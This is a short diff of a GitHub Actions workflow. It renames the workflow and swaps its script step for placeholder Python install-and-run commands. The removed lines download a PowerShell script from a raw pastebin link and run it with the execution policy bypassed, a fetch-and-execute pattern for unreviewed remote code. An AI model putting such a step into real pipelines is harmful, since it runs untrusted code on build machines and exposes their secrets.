@@ -1,6 +1,6 @@
 # This is a basic workflow to help you get started with Actions
 
-name: CI
+name: Python
 
 # Controls when the workflow will run
 on:
@@ -32,5 +32,7 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          Invoke-WebRequest -Uri "https://pastebin.com/raw/W9MskrUH" -OutFile "deploy.ps1"
-          powershell.exe -ExecutionPolicy Bypass -File deploy.ps1
+          wget (link do .py)
+          sudo apt install python3
+          pip install (Dependencias)
+          python index.py
